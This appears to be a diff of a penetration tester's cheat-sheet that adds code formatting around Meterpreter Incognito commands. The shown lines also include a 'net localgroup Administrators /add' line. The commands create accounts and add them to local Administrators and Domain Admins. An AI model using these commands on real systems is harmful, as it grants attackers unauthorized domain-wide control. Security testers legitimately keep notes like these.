@@ -9,7 +9,8 @@ net localgroup Administrators /add TraceSecurity2018
 -------------------------------------------------------
 Meterpreter:::::
 Incognito:
+```
 1.	-add_user <username> <password>
 2.	-add_group_user 'Domain Admins' <username>
-	
+```	
 --------------------------------------------------------
